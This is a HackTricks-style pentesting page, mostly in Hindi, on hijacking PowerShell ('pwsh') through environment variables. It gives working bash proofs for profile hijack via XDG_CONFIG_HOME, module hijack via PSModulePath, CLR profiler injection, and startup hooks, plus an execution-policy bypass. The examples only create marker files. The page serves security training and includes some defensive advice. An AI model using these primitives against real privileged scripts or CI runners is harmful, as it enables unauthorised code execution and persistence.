# macOS PowerShell Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

PowerShell cross-platform है: वही `pwsh` binary macOS, Linux और Windows पर चलती है, और यह एक **.NET (Core) application** है। इससे `pwsh` invocation के environment को नियंत्रित करने वाले attacker को कई environment-variable → code-execution primitives मिलते हैं, जो तीनों OSes पर समान रूप से काम करते हैं, साथ ही कुछ केवल Windows पर काम करने वाले primitives भी मिलते हैं। ये सभी victim द्वारा चलाए जाने वाले `-Command`/`-File` से **पहले** (या उसकी जगह) execute होते हैं। इसलिए ये privileged wrappers, cron/`launchd`/systemd jobs और ऐसे CI runners के विरुद्ध आदर्श हैं, जो inherited environment के साथ `pwsh` को shell out करते हैं।

## `XDG_CONFIG_HOME` और PowerShell profiles

macOS और Linux पर PowerShell XDG configuration paths का उपयोग करता है और `pwsh` शुरू होने पर user profile scripts execute करता है। `XDG_CONFIG_HOME` को redirect करने से `powershell/profile.ps1` और console-host-specific `powershell/Microsoft.PowerShell_profile.ps1` वाली directory बदल जाती है; इसलिए वहां नियंत्रित की गई file `-Command` payload से पहले execute हो सकती है।<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```
यह non-Windows platforms पर PowerShell 6+ (`pwsh`) पर लागू होता है; Windows PowerShell अलग profile locations का उपयोग करता है। `pwsh -NoProfile` profile loading को रोकता है। साथ ही `HOME` और host-specific profile names की भी जाँच करें, क्योंकि अन्य PowerShell hosts अलग scripts चुन सकते हैं।

> [!TIP]
> **Windows** पर profile paths `$HOME` / *Documents* known folder से निर्धारित होते हैं (जैसे `pwsh` के लिए `Documents\PowerShell\Microsoft.PowerShell_profile.ps1`, और Windows PowerShell के लिए `Documents\WindowsPowerShell\...`), इसलिए `HOME`/`USERPROFILE` को प्रभावित करना — या बस उस file को लिखना — equivalent primitive है।

## `PSModulePath` module auto-loading hijack

PowerShell 3.0 से **module auto-loading** किसी module द्वारा export किए गए command का पहली बार reference (invoke, `Get-Command`, या tab-completion) किए जाने पर उस module को automatically import करता है। PowerShell `.psd1`/`.psm1` files के लिए **`$Env:PSModulePath`** में सूचीबद्ध प्रत्येक directory को recursively search करता है, और non-Windows पर process-inherited `PSModulePath` को as-is honor किया जाता है। इसलिए यदि आप `PSModulePath` में कोई directory **prepend** कर सकते हैं, तो आप ऐसा module रख सकते हैं जो victim script द्वारा call किए गए command से match करता हो या उस module name से match करता हो जिसे script `Import-Module` करता है — और आपका module-scope code import के समय run हो जाता है।<sup>[[3]](#references)</sup>

क्योंकि PowerShell command resolution *Alias → Function → Cmdlet → Application* क्रम का पालन करता है, आपके module द्वारा exported **function** target द्वारा उपयोग किए जाने वाले built-in cmdlet (जैसे `Get-ChildItem`) को **shadow** कर सकता है। इसलिए victim को किसी चीज़ को नाम से import करने की भी आवश्यकता नहीं होती।
```bash
# Attacker-controlled module dir prepended to PSModulePath
mkdir -p /tmp/evil/Hijack
cat >/tmp/evil/Hijack/Hijack.psm1 <<'PS1'
# Top-level module code runs at import time
New-Item -ItemType File -Path /tmp/psmodulepath-executed -Force | Out-Null
function Invoke-Report { 'hijacked' }   # shadows whatever the victim calls
Export-ModuleMember -Function Invoke-Report
PS1
cat >/tmp/evil/Hijack/Hijack.psd1 <<'PS1'
@{ ModuleVersion = '1.0'; RootModule = 'Hijack.psm1'; FunctionsToExport = @('Invoke-Report') }
PS1

# Victim runs pwsh with an inherited/attacker-influenced PSModulePath and calls Invoke-Report
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/psmodulepath-executed && echo 'PSModulePath auto-load executed'
```
**Windows** पर भी यही लागू होता है (`;`-separated paths); `PSModulePath` `HKCU:\Environment` और `HKLM:\...\Session Manager\Environment` से भी value लेता है, इसलिए writable user-scope value भी एक persistence primitive है। Auto-loading को `$PSModuleAutoloadingPreference = 'None'` से disable किया जा सकता है, और `pwsh -NoProfile` इसे नहीं रोकता।

## CLR profiler injection (`CORECLR_PROFILER` / `COR_PROFILER`)

`pwsh` .NET Core पर चलता है, इसलिए **CLR profiling API** attacker की DLL/`.so`/`.dylib` को startup के समय केवल environment से process में load कर सकता है — किसी signature की आवश्यकता नहीं होती, और COM registration भी आवश्यक नहीं है क्योंकि `*_PATH` variables registry पर precedence रखते हैं। Profiler library का `DllMain`/entry point PowerShell process के अंदर execute होता है, जो in-process code-execution और persistence की एक classic technique है (MITRE ATT&CK **T1574.012**)।<sup>[[4]](#references)</sup>
```bash
# .NET Core / .NET 5+ (pwsh) — cross-platform. Use .so on Linux, .dylib on macOS, .dll on Windows.
CORECLR_ENABLE_PROFILING=1 \
CORECLR_PROFILER='{cf0d821e-299b-5307-a3d8-b283c03916db}' \
CORECLR_PROFILER_PATH=/tmp/evil_profiler.so \
pwsh -Command '$true'
```
- **.NET 8+** पर variables नए `DOTNET_` prefix (`DOTNET_EnableDiagnostics=1`, `DOTNET_ENABLE_PROFILING=1`, `DOTNET_PROFILER`, `DOTNET_PROFILER_PATH`) का भी उपयोग कर सकते हैं; `CORECLR_*` को backwards compatibility के लिए रखा गया है।
- **Windows PowerShell 5.1** (`powershell.exe`, .NET Framework) पर equivalent trio **`COR_ENABLE_PROFILING=1`**, **`COR_PROFILER={CLSID}`** और **`COR_PROFILER_PATH=C:\evil.dll`** है।

Profiler DLL का केवल एक valid COM/ICorProfilerCallback library होना आवश्यक है (या यह अपना काम सीधे `DllMain` से कर सकती है)। Defensive launchers को privileged environments से `COR_*`/`CORECLR_*`/`DOTNET_*` हटाने चाहिए।

## `DOTNET_STARTUP_HOOKS` (pre-`Main` .NET hook)

क्योंकि `pwsh` एक .NET Core application है, **`DOTNET_STARTUP_HOOKS`** एक managed assembly की ओर संकेत करता है, जिसका `StartupHook.Initialize()` host के `Main` से पहले synchronously चलता है — अर्थात PowerShell स्वयं शुरू होने से पहले। यह सबसे साफ managed-code primitive है और हर दूसरे .NET app के साथ shared है:

{{#ref}}
macos-.net-applications-injection.md
{{#endref}}

## `PSExecutionPolicyPreference` (Windows control bypass)

Windows पर environment variable **`$Env:PSExecutionPolicyPreference`** को (जैसे `Bypass` या `Unrestricted` पर) set करने से उस process के लिए effective Execution Policy override हो जाती है — यही वह value है जिसे `Set-ExecutionPolicy -Scope Process` लिखता है। यह अपने-आप code execution नहीं है, लेकिन यह "unsigned scripts are blocked" guardrail हटा देता है, जो अक्सर ऊपर दिए गए primitives में से किसी एक (planted profile / module) को वास्तव में run कराने के लिए missing link होता है। Execution Policy केवल Windows-specific है और कभी भी security boundary नहीं थी।<sup>[[5]](#references)</sup>

## References

- [1] [PowerShell environment variables और XDG paths](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [PowerShell profiles](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
- [3] [about_PSModulePath और module auto-loading](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [4] [.NET debugging और profiling config settings (CORECLR_/DOTNET_ profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
- [5] [about_Execution_Policies (PSExecutionPolicyPreference)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)
{{#include ../../../banners/hacktricks-training.md}}
